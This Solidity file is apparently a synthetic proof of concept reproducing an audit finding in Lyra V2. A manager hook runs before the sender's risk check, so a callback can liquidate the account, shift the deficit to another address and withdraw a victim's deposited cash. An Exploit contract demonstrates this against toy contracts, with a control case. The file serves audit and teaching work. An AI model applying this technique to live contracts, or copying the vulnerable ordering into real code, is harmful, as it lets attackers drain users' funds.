// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Lyra V2 — liquidate during an asset transfer, before the risk check
    (Sigma Prime, Lyra Finance review, StandardManager / DutchAuction).
    SYNTHETIC, cheatcode-free reduction of the audited order:
    deltas are applied, managerData calls out, and only then is the sender
    risk-checked. The callback bids the insolvent account at stepInsolvent = 0,
    so the deficit moves to the liquidator with no risk check. The sender is
    empty, the check passes, and the recipient withdraws cash nobody deposited. */

contract Cash26267 {
    string public name = "Cash";
    string public symbol = "CASH";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IManagerHook26267 {
    function acceptData(address account) external;
}

contract LyraBook26267 {
    Cash26267 public cash;
    bool public hookBeforeCheck;
    address public hook;
    mapping(address => int256) public net;

    constructor(Cash26267 c, bool hookFirst) {
        cash = c;
        hookBeforeCheck = hookFirst;
    }

    function setHook(address h) external {
        hook = h;
    }

    function credit(address account, uint256 amount) external {
        net[account] += int256(amount);
    }

    function submitTransfer(address alice, address bob, uint256 gift) external {
        net[alice] -= int256(gift);
        net[bob] += int256(gift);
        if (hookBeforeCheck) {
            // @> VULN: managerData runs before the risk check, so the callback can liquidate Alice and move her deficit away.
            IManagerHook26267(hook).acceptData(alice);
        }
        require(net[alice] >= 0, "insolvent");
        if (!hookBeforeCheck) {
            IManagerHook26267(hook).acceptData(alice);
        }
    }

    // Insolvent auction, same transaction: stepInsolvent is 0. The whole deficit
    // moves to the bidder. The bidder is not risk-checked.
    function bid(address from, address bidder) external {
        int256 position = net[from];
        net[from] = 0;
        net[bidder] += position;
    }

    function withdraw(address account) external returns (uint256 paid) {
        int256 n = net[account];
        require(n > 0, "nothing");
        net[account] = 0;
        paid = uint256(n);
        cash.transfer(account, paid);
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;
    address public constant ALICE = 0x4444444444444444444444444444444444444444;
    address public constant CYNTHIA = 0x3333333333333333333333333333333333333333;
    address public constant VICTIM = 0x5555555555555555555555555555555555555555;

    Cash26267 public cash;
    LyraBook26267 public book;
    Cash26267 public cashC;
    LyraBook26267 public bookC;

    uint256 public reserves;
    bool public hooked;
    uint256 public bobPulled;
    uint256 public victimLeft;
    bool public victimBlocked;
    bool public controlReverted;
    uint256 public controlVictimGot;
    int256 public cynthiaNet;

    function acceptData(address alice) external {
        LyraBook26267(msg.sender).bid(alice, CYNTHIA);
        hooked = true;
    }

    function run() external {
        cash = new Cash26267();
        book = new LyraBook26267(cash, true);
        cashC = new Cash26267();
        bookC = new LyraBook26267(cashC, false);

        cash.mint(address(book), N);
        reserves = cash.balanceOf(address(book));
        book.credit(VICTIM, N);
        book.setHook(address(this));

        book.submitTransfer(ALICE, address(this), N);
        cynthiaNet = book.net(CYNTHIA);
        bobPulled = book.withdraw(address(this));
        victimLeft = cash.balanceOf(address(book));

        try book.withdraw(VICTIM) {
            victimBlocked = false;
        } catch {
            victimBlocked = true;
        }

        cashC.mint(address(bookC), N);
        bookC.credit(VICTIM, N);
        bookC.setHook(address(this));
        try bookC.submitTransfer(ALICE, address(this), N) {
            controlReverted = false;
        } catch {
            controlReverted = true;
        }
        controlVictimGot = bookC.withdraw(VICTIM);

        require(reserves == N, "reserves");
        require(hooked, "hook");
        require(cynthiaNet == -int256(N), "cynthia");
        require(bobPulled == N, "bob");
        require(victimLeft == 0, "victim cash");
        require(victimBlocked, "victim blocked");
        require(cash.balanceOf(address(this)) == N, "attacker cash");
        require(cash.balanceOf(VICTIM) == 0, "victim got cash");
        require(controlReverted, "control");
        require(controlVictimGot == N, "control victim");
        require(cashC.balanceOf(VICTIM) == N, "control token");
    }
}
